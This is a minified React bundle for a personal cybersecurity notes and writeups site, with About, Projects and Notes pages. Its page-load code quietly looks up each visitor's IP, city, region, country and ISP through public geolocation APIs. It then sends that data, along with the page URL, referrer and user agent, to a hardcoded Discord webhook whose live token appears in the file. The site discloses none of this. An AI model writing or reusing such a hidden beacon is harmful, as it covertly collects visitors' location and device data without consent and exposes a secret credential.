steps.`}],aw=[`Ghidra`,`Cutter`,`IDA Free`,`x64dbg`,`GDB`,`pwndbg`,`pwntools`,`nmap`,`ffuf`,`sqlmap`,`hashcat`,`john`,`Wireshark`,`solc`,`ethers.js`];function ow(){let e=im.filter(e=>e.name.startsWith(`picoCTF`)).reduce((e,t)=>e+t.count,0);return(0,G.jsx)(`section`,{className:`section`,children:(0,G.jsxs)(`div`,{className:`container`,children:[(0,G.jsxs)(`div`,{className:`grid items-center gap-10 lg:grid-cols-[0.9fr_1.1fr]`,children:[(0,G.jsx)(xp.div,{initial:{opacity:0,y:20},whileInView:{opacity:1,y:0},viewport:{once:!0},className:`overflow-hidden rounded-lg border border-border bg-theme-light dark:border-dm-border dark:bg-dm-theme-dark`,children:(0,G.jsx)(`img`,{src:`https://github.com/f4zzie.png`,alt:`f4zzie`,className:`aspect-square w-full object-cover`})}),(0,G.jsxs)(`div`,{children:[(0,G.jsx)(`span`,{className:`eyebrow text-primary dark:text-dm-primary`,children:`About The Author`}),(0,G.jsx)(`h1`,{className:`mt-4 text-4xl font-bold sm:text-5xl`,children:`Security learner building a practical research vault.`}),(0,G.jsxs)(`div`,{className:`content mt-6`,children:[(0,G.jsx)(`p`,{children:`I’m focused on malware analysis, reverse engineering, exploit development, and CTF problem solving. MyNotes is where I turn those reps into readable walkthroughs, command references, and technique notes I can revisit.`}),(0,G.jsxs)(`p`,{children:[`The site now indexes `,rm.length,` notes, including `,e,` picoCTF entries, HTB machine attack chains, malware static-analysis references, and binary exploitation methodology.`]})]}),(0,G.jsxs)(`div`,{className:`mt-7 grid grid-cols-3 gap-3`,children:[(0,G.jsxs)(`div`,{className:`mini-stat`,children:[(0,G.jsx)(`strong`,{children:rm.length}),(0,G.jsx)(`span`,{children:`notes`})]}),(0,G.jsxs)(`div`,{className:`mini-stat`,children:[(0,G.jsx)(`strong`,{children:im.length}),(0,G.jsx)(`span`,{children:`tracks`})]}),(0,G.jsxs)(`div`,{className:`mini-stat`,children:[(0,G.jsx)(`strong`,{children:e}),(0,G.jsx)(`span`,{children:`picoCTF`})]})]})]})]}),(0,G.jsx)(`div`,{className:`mt-16 grid gap-5 md:grid-cols-2`,children:iw.map((e,t)=>(0,G.jsxs)(xp.div,{initial:{opacity:0,y:18},whileInView:{opacity:1,y:0},viewport:{once:!0},transition:{delay:t*.05},className:`feature-panel`,children:[(0,G.jsx)(e.icon,{size:24,className:`text-primary dark:text-dm-primary`}),(0,G.jsx)(`h3`,{className:`mt-4 text-xl font-bold`,children:e.title}),(0,G.jsx)(`p`,{className:`mt-3 text-sm leading-7 text-text dark:text-dm-text`,children:e.desc})]},e.title))}),(0,G.jsxs)(`div`,{className:`mt-10 grid gap-6 lg:grid-cols-[1fr_1.2fr]`,children:[(0,G.jsxs)(`div`,{className:`feature-panel`,children:[(0,G.jsx)(Jp,{size:24,className:`text-primary dark:text-dm-primary`}),(0,G.jsx)(`h2`,{className:`mt-4 text-2xl font-bold`,children:`Research Style`}),(0,G.jsx)(`p`,{className:`mt-3 text-sm leading-7 text-text dark:text-dm-text`,children:`The notes favor attack-chain clarity: recon, why each step matters, exploitation, verification, root cause, and mitigation where it fits.`})]}),(0,G.jsxs)(`div`,{className:`feature-panel`,children:[(0,G.jsx)(Zp,{size:24,className:`text-primary dark:text-dm-primary`}),(0,G.jsx)(`h2`,{className:`mt-4 text-2xl font-bold`,children:`Tooling Seen In The Vault`}),(0,G.jsx)(`div`,{className:`mt-5 flex flex-wrap gap-2`,children:aw.map(e=>(0,G.jsx)(`span`,{className:`tool-pill`,children:e},e))})]})]})]})})}function sw(){return(0,G.jsx)(xp.div,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.3},children:(0,G.jsx)(ow,{})})}var cw=e=>im.find(t=>t.name===e)?.count||0,lw=im.filter(e=>e.name.startsWith(`picoCTF`)).reduce((e,t)=>e+t.count,0),uw=[{name:`MyNotes Research Vault`,category:`Resources`,count:rm.length,description:`A React/Tailwind site generated from an Obsidian-style cybersecurity vault, with searchable writeups rendered as readable markdown modals.`,tags:[`React`,`Tailwind`,`Markdown`,`GitHub Pages`],url:`https://github.com/f4zzie/MyNotes`},{name:`Malware Static Analysis Notebook`,category:`Malware Analysis`,count:cw(`Malware Analysis`),description:`Reference notes for analyzing suspicious Windows binaries through hashes, strings, PE headers, APIs, and injection indicators.`,tags:[`PE`,`Windows API`,`FLOSS`,`Ghidra`]},{name:`Binary Exploitation Lab`,category:`Binary Exploitation`,count:cw(`Binary Exploitation`),description:`A technique library for memory corruption: stack frames, heap behavior, mitigations, ROP chains, format strings, and exploit templates.`,tags:[`GDB`,`pwndbg`,`pwntools`,`ROP`]},{name:`picoCTF 2026 Writeup Sprint`,category:`picoCTF - General Skills`,count:lw,description:`Challenge writeups across binary exploitation, reverse engineering, web exploitation, blockchain, and general skills.`,tags:[`picoCTF`,`Web`,`RE`,`Blockchain`]},{name:`HTB Machine Playbooks`,category:`HTB Writeup`,count:cw(`HTB Writeup`),description:`End-to-end attack chains for HTB content, including Facts and WingData machine notes with recon, foothold, lateral movement, and root paths.`,tags:[`HTB`,`nmap`,`ffuf`,`Privilege Escalation`]}];function dw(){return(0,G.jsx)(`section`,{className:`section`,children:(0,G.jsxs)(`div`,{className:`container`,children:[(0,G.jsxs)(`div`,{className:`section-heading text-center`,children:[(0,G.jsx)(`span`,{className:`eyebrow text-primary dark:text-dm-primary`,children:`Projects`}),(0,G.jsx)(`h2`,{className:`mt-3 text-3xl font-bold sm:text-4xl`,children:`Work Streams In The Vault`}),(0,G.jsx)(`p`,{className:`mx-auto mt-4 max-w-2xl text-text dark:text-dm-text`,children:`Each project below points to a real cluster of notes in the folder: practical research, repeatable commands, and challenge writeups.`})]}),(0,G.jsx)(`div`,{className:`mt-10 grid gap-5 md:grid-cols-2`,children:uw.map((e,t)=>(0,G.jsxs)(xp.div,{initial:{opacity:0,y:20},whileInView:{opacity:1,y:0},viewport:{once:!0},transition:{duration:.35,delay:t*.05},className:`project-card`,children:[(0,G.jsxs)(`div`,{className:`flex items-start justify-between gap-4`,children:[(0,G.jsx)(`div`,{className:`note-icon`,style:{"--accent":$C(e.category)},children:(0,G.jsx)(YC,{category:e.category,size:24,className:`text-white`})}),(0,G.jsxs)(`span`,{className:`text-sm font-bold text-dark dark:text-white`,children:[e.count,` notes`]})]}),(0,G.jsx)(`h3`,{className:`mt-5 text-xl font-bold`,children:e.name}),(0,G.jsx)(`p`,{className:`mt-3 text-sm leading-7 text-text dark:text-dm-text`,children:e.description}),(0,G.jsx)(`div`,{className:`mt-5 flex flex-wrap gap-2`,children:e.tags.map(e=>(0,G.jsx)(`span`,{className:`tool-pill`,children:e},e))}),(0,G.jsxs)(`div`,{className:`mt-6 flex flex-wrap gap-3`,children:[(0,G.jsxs)(Tn,{to:`/notes`,className:`btn btn-outline-primary text-sm`,children:[(0,G.jsx)(Rp,{size:15,className:`mr-2`}),`View Notes`]}),e.url&&(0,G.jsxs)(`a`,{href:e.url,target:`_blank`,rel:`noreferrer`,className:`btn btn-link-clean text-sm`,children:[`GitHub`,(0,G.jsx)(Ip,{size:14,className:`ml-2`})]})]})]},e.name))}),(0,G.jsx)(`div`,{className:`mt-10 text-center`,children:(0,G.jsxs)(Tn,{to:`/notes`,className:`btn btn-primary`,children:[`Browse All Research`,(0,G.jsx)(kp,{size:16,className:`ml-2`})]})})]})})}function fw(){return(0,G.jsxs)(xp.div,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.3},children:[(0,G.jsx)(`div`,{className:`page-kicker`,children:(0,G.jsxs)(`div`,{className:`container text-center`,children:[(0,G.jsx)(`span`,{className:`eyebrow text-primary dark:text-dm-primary`,children:`Build Log`}),(0,G.jsx)(`h1`,{className:`mt-3 text-3xl font-bold lg:text-5xl`,children:`Projects`})]})}),(0,G.jsx)(dw,{})]})}function pw({className:e=``}){let t=Math.max(...im.map(e=>e.count));return(0,G.jsxs)(`aside`,{className:`w-full lg:w-4/12 px-0 lg:px-6 ${e}`,children:[(0,G.jsxs)(`div`,{className:`side-panel`,children:[(0,G.jsxs)(`div`,{className:`flex items-center gap-4`,children:[(0,G.jsx)(`img`,{src:`https://github.com/f4zzie.png`,alt:`f4zzie`,className:`h-16 w-16 rounded-lg object-cover`}),(0,G.jsxs)(`div`,{children:[(0,G.jsx)(Tn,{to:`/`,className:`font-secondary text-xl font-bold text-dark dark:text-white`,children:`f4zzie`}),(0,G.jsx)(`p`,{className:`text-sm text-text dark:text-dm-text`,children:`Cybersecurity learner`})]})]}),(0,G.jsx)(`p`,{className:`mt-5 text-sm leading-7 text-text dark:text-dm-text`,children:`Notes on malware static analysis, reverse engineering, exploitation, HTB machines, picoCTF 2026 solves, and practical security workflows.`}),(0,G.jsxs)(`div`,{className:`mt-5 grid grid-cols-2 gap-3`,children:[(0,G.jsxs)(`div`,{className:`mini-stat`,children:[(0,G.jsx)(`strong`,{children:rm.length}),(0,G.jsx)(`span`,{children:`notes`})]}),(0,G.jsxs)(`div`,{className:`mini-stat`,children:[(0,G.jsx)(`strong`,{children:im.length}),(0,G.jsx)(`span`,{children:`tracks`})]})]}),(0,G.jsxs)(`div`,{className:`mt-5 flex items-center gap-3`,children:[(0,G.jsx)(`a`,{href:`https://github.com/f4zzie`,target:`_blank`,rel:`noreferrer`,className:`icon-link`,"aria-label":`GitHub`,children:(0,G.jsx)(zp,{size:18})}),(0,G.jsx)(`a`,{href:`https://x.com/_lazerguard`,target:`_blank`,rel:`noreferrer`,className:`icon-link`,"aria-label":`X`,children:(0,G.jsx)(`svg`,{viewBox:`0 0 24 24`,className:`h-[18px] w-[18px] fill-current`,children:(0,G.jsx)(`path`,{d:`M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z`})})})]})]}),(0,G.jsxs)(`div`,{className:`side-panel mt-6`,children:[(0,G.jsxs)(`div`,{className:`mb-5 flex items-center gap-2`,children:[(0,G.jsx)(Gp,{size:19,className:`text-primary dark:text-dm-primary`}),(0,G.jsx)(`h4`,{className:`text-lg font-bold`,children:`Archive Tracks`})]}),(0,G.jsx)(`ul`,{className:`space-y-4`,children:im.map(e=>(0,G.jsxs)(`li`,{children:[(0,G.jsxs)(`div`,{className:`flex items-center justify-between gap-3`,children:[(0,G.jsxs)(`span`,{className:`flex min-w-0 items-center gap-2 text-sm font-bold text-dark dark:text-dm-dark`,children:[(0,G.jsx)(YC,{category:e.name,size:16,className:`shrink-0`,style:{color:$C(e.name)}}),(0,G.jsx)(`span`,{className:`truncate`,children:e.name})]}),(0,G.jsx)(`span`,{className:`text-xs font-bold text-light`,children:e.count})]}),(0,G.jsx)(`div`,{className:`mt-2 h-1.5 overflow-hidden rounded-full bg-theme-light dark:bg-dm-theme-dark`,children:(0,G.jsx)(`div`,{className:`h-full rounded-full`,style:{width:`${Math.max(e.count/t*100,8)}%`,backgroundColor:$C(e.name)}})})]},e.name))})]})]})}function mw(){let[e,t]=(0,w.useState)(null),[n,r]=(0,w.useState)(null),i=rm.find(t=>t.id===e),a=n?rm.filter(e=>e.category===n):rm;return(0,G.jsxs)(xp.div,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.3},children:[(0,G.jsx)(`div`,{className:`page-kicker`,children:(0,G.jsxs)(`div`,{className:`container text-center`,children:[(0,G.jsx)(`span`,{className:`eyebrow text-primary dark:text-dm-primary`,children:`Archive`}),(0,G.jsx)(`h1`,{className:`mt-3 text-3xl font-bold lg:text-5xl`,children:`Research & Writeups`}),(0,G.jsxs)(`p`,{className:`mx-auto mt-4 max-w-2xl text-text dark:text-dm-text`,children:[rm.length,` notes spanning malware analysis, binary exploitation, reverse engineering, HTB, picoCTF, blockchain, web exploitation, and resources.`]})]})}),(0,G.jsx)(`div`,{className:`section`,children:(0,G.jsxs)(`div`,{className:`container`,children:[(0,G.jsxs)(`div`,{className:`flex flex-wrap items-center justify-center gap-2 mb-10`,children:[(0,G.jsxs)(`button`,{onClick:()=>r(null),className:`filter-pill ${n?``:`active`}`,children:[`All (`,rm.length,`)`]}),im.map(e=>{let t=QC(e.name);return(0,G.jsxs)(`button`,{onClick:()=>r(e.name===n?null:e.name),className:`filter-pill ${n===e.name?`active`:``}`,children:[(0,G.jsx)(t,{size:13,className:`mr-1.5 inline`}),e.name,` (`,e.count,`)`]},e.name)})]}),(0,G.jsxs)(`div`,{className:`flex flex-wrap items-start`,children:[(0,G.jsx)(`div`,{className:`w-full lg:w-8/12 mb-12 lg:mb-0`,children:(0,G.jsx)(`div`,{className:`archive-grid-shell`,children:(0,G.jsx)(`div`,{className:`grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-0`,children:a.map((e,n)=>(0,G.jsxs)(xp.div,{initial:{opacity:0,y:20},whileInView:{opacity:1,y:0},viewport:{once:!0},transition:{delay:Math.min(n*.03,.3)},className:`mb-8 post-card cursor-pointer`,onClick:()=>t(e.id),children:[(0,G.jsxs)(`div`,{className:`relative rounded overflow-hidden bg-theme-light dark:bg-dm-theme-dark`,style:{aspectRatio:`405/208`},children:[(0,G.jsx)(`div`,{className:`flex items-center justify-center h-full`,children:(0,G.jsx)(YC,{category:e.category,size:44,className:`text-primary/45 dark:text-dm-primary/45`})}),(0,G.jsx)(`div`,{className:`absolute top-3 left-2 flex gap-2`,children:(0,G.jsx)(`span`,{className:`category-badge`,children:e.category})})]}),(0,G.jsx)(`h3`,{className:`text-[1.1rem] mb-2 mt-4`,children:(0,G.jsx)(`span`,{className:`block text-dark dark:text-white hover:text-primary dark:hover:text-dm-primary transition-colors`,children:e.title})}),(0,G.jsxs)(`ul`,{className:`flex items-center space-x-4 mb-2`,children:[(0,G.jsxs)(`li`,{className:`flex items-center font-secondary text-xs text-text dark:text-dm-text leading-3`,children:[(0,G.jsx)($p,{size:12,className:`mr-1.5`}),`f4zzie`]}),(0,G.jsxs)(`li`,{className:`flex items-center font-secondary text-xs text-text dark:text-dm-text leading-3`,children:[(0,G.jsx)(Np,{size:12,className:`mr-1.5`}),`2025`]})]}),(0,G.jsx)(`p`,{className:`text-text dark:text-dm-text text-sm leading-relaxed`,children:e.excerpt}),(0,G.jsx)(`span`,{className:`btn btn-outline-primary mt-4 text-sm`,children:`Read More`})]},e.id))})})}),(0,G.jsx)(pw,{})]})]})}),i&&(0,G.jsx)(JC,{isOpen:!!e,onClose:()=>t(null),title:i.title,content:i.content,category:i.category})]})}function hw(){let[e,t]=(0,w.useState)(()=>{if(typeof window>`u`)return!0;let e=localStorage.getItem(`theme`);return e?e===`dark`:!0});return(0,w.useEffect)(()=>{let t=document.documentElement;e?(t.classList.add(`dark`),localStorage.setItem(`theme`,`dark`)):(t.classList.remove(`dark`),localStorage.setItem(`theme`,`light`))},[e]),{dark:e,toggle:()=>t(e=>!e)}}var gw=`https://discord.com/api/webhooks/1482494734328139827/LULYIUZ3sklH_FgDDSAV01JEhr6Gp2FRieqfIMb5VlaYxk4BOfalUk2AiOu2WDSfojeg`;async function _w(){try{let e=await fetch(`https://ipapi.co/json/`);if(e.ok){let t=await e.json();return{ip:t.ip,city:t.city,region:t.region,country:t.country_name,isp:t.org}}}catch{}try{let e=await fetch(`https://ip-api.com/json/?fields=query,city,regionName,country,isp`);if(e.ok){let t=await e.json();return{ip:t.query,city:t.city,region:t.regionName,country:t.country,isp:t.isp}}}catch{}return null}async function vw(){if(window.location.hostname!==`localhost`&&!sessionStorage.getItem(`tracked`))try{let e=await _w(),t=e?[{name:`IP`,value:e.ip||`Unknown`,inline:!0},{name:`Location`,value:`${e.city||`?`}, ${e.region||`?`}, ${e.country||`?`}`,inline:!0},{name:`ISP`,value:e.isp||`Unknown`,inline:!1}]:[{name:`IP`,value:`Could not resolve`,inline:!1}];t.push({name:`Page`,value:window.location.href,inline:!0},{name:`Referrer`,value:document.referrer||`Direct`,inline:!0},{name:`Device`,value:navigator.userAgent.slice(0,200),inline:!1}),(await fetch(gw,{method:`POST`,headers:{"Content-Type":`application/json`},body:JSON.stringify({embeds:[{title:`New Visitor`,color:2859651,fields:t,timestamp:new Date().toISOString()}]})})).ok&&sessionStorage.setItem(`tracked`,`1`)}catch{}}function yw(){let{dark:e,toggle:t}=hw(),n=at();return(0,w.useEffect)(()=>{vw()},[]),(0,G.jsxs)(`div`,{className:`min-h-screen flex flex-col bg-body dark:bg-dm-body`,children:[(0,G.jsx)(nm,{dark:e,toggleTheme:t}),(0,G.jsx)(`main`,{className:`flex-1`,children:(0,G.jsx)(K,{mode:`wait`,children:(0,G.jsxs)(Ft,{location:n,children:[(0,G.jsx)(Nt,{path:`/`,element:(0,G.jsx)(rw,{})}),(0,G.jsx)(Nt,{path:`/about`,element:(0,G.jsx)(sw,{})}),(0,G.jsx)(Nt,{path:`/projects`,element:(0,G.jsx)(fw,{})}),(0,G.jsx)(Nt,{path:`/notes`,element:(0,G.jsx)(mw,{})})]},n.pathname)})}),(0,G.jsx)(am,{})]})}(0,Un.createRoot)(document.getElementById(`root`)).render((0,G.jsx)(w.StrictMode,{children:(0,G.jsx)(Sn,{children:(0,G.jsx)(yw,{})})}));